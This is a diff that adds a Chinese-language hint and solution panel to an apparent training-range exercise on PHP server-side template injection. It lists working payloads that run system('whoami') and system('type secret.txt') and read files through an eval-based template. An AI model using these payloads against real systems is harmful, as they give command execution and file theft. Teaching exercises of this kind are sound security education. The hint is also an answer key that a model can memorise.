@@ -1,0 +1,18 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>SSTI 的核心是<b>模板引擎把 <code>{{ }}</code> 里的内容当成表达式执行</b>。思路分三步：① 先用一个简单的数学表达式（如 <code>{{7*7}}</code>）确认是否被执行；② 确认后尝试执行系统命令或读取环境信息（如 <code>phpversion()</code>、<code>system('whoami')</code>）；③ 找到通关凭证所在位置（通常在当前目录的 <code>secret.txt</code>），用文件读取函数或命令读出。注意本靶场是 Windows 环境，命令和路径要兼容 Windows。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>解题步骤：</b><br>
+1. 探测：提交 <code>{{7*7}}</code>，输出 <code>49</code> 说明表达式被执行。<br>
+2. 指纹：<code>{{phpversion()}}</code>、<code>{{php_uname()}}</code>。<br>
+3. 执行：<code>{{system('whoami')}}</code>（Windows 环境没有 <code>id</code> 命令，用 <code>whoami</code> 才有回显）。<br>
+4. 定位通关凭证：<code>{{getcwd()}}</code> 查看工作目录。<br>
+5. 读取：<code>{{system('type secret.txt')}}</code><br>
+<b>原理：</b><code>{{ }}</code> 中非已知变量的内容会被拼成
+<code>eval('return ' . $expr . ';')</code>，因此任意 PHP 表达式都会以 Web 服务进程权限执行。<br>
+<b>也可不用 shell：</b><code>{{file_get_contents('secret.txt')}}</code>
+</div>
+</details>
